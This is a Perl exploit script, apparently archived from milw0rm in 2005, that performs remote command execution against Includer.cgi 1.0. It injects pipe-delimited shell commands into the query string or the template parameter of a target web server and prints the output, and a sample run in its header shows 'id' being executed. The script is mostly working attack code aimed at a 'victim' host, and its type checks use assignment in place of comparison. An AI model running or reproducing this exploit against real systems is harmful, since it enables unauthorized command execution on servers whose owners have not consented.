#!/usr/bin/perl
#
# [K-C0d3r] Includer.cgi 1.0 remote command execution [K-C0d3r]
#
# C0d3d By K-C0d3r, a www.x0n3-h4ck.org friend!
#
# I think the bug was discovered by Francisco Alisson.
#
# Greetz to: mZ, CorryL, Expanders, SiNaPsE, off, rikky, milw0rm.
#
# F**K o*f to all RxBot kiddies as e*****t, G***n, d***b.
#
##########################################################################
# [kc@K-C0d3r xpl]$ perl KCincluder.pl 127.0.0.1 /cgi-bin/includer.cgi 1
# [K-C0d3r] Includer.cgi Remote Command Execution Exploit [K-C0d3r]
# [?] Insert command: id
# [+] Conecting to 127.0.0.1
# [+] Connected to 127.0.0.1
# [+] Injecting command ...
# uid=500(kc) gid=500(kc) gruppi=500(kc)
# [kc@K-C0d3r xpl]$
##########################################################################

use IO::Socket;

sub Usage {
print STDERR "www.hackbase.com\nUsage:\nKCinc-xpl.pl <www.victim.com> </path/to/includer.cgi> <exploitation_type>.\n";
print STDERR "Exploitation Types:\n \t\t1: includer.cgi?|command|\n \t\t2: includer.cgi?template=|command|\n\n";

exit;
}

if (@ARGV < 3)
{
 Usage();
}


$host = @ARGV[0];
$path = @ARGV[1];
print "[K-C0d3r] Includer.cgi Remote Command Execution Exploit [K-C0d3r]\n";
print "[?] Insert command: ";
$command = <STDIN>;
$type = @ARGV[2];

if ($type > 2)
{
 Usage();
}


print "[+] Conecting to $host\n";

if ($type = 1)
{
$injection = "$host$path?|$command|";
$socket = new IO::Socket::INET (PeerAddr => "$host",
                                PeerPort => 80,
                                Proto => 'tcp');
                                die unless $socket;
print "[+] Connected to $host\n";
print "[+] Injecting command ...\n";
print $socket "GET http://$injection HTTP/1.1\nHost: $host\n\n";
while (<$socket>)
{
 print $_;
 exit;
}
}

if ($type = 2)
{
$injection = "$host$path?template=|$command|";
$socket = new IO::Socket::INET (PeerAddr => "$host",
                                PeerPort => 80,
                                Proto => 'tcp');
                                die unless $socket;
print "[+] Connected to $host\n";
print "[+] Injecting command\n";
print $socket "GET http://$injection HTTP/1.1\nHost: $host\n\n";
while (<$socket>)
{
 print $_;
 exit;
}
}
# milw0rm.com [2005-04-08] 